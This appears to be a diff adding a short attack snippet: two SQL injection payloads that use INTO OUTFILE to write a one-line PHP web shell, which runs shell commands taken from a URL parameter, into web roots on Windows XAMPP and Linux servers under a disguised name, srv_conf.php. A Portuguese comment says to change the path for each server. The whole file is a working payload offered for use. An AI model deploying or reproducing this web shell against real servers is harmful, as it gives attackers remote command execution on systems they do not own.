@@ -1,0 +1,5 @@
+select "<?php system($_GET['c']); ?>" into outfile "C:\\xampp\\htdocs\\srv_conf.php"
+select "<?php system($_GET['c']); ?>" into outfile "/root/var/www/html/srv_conf.php" --
+
+
+##mudar o path dependendo do servidor
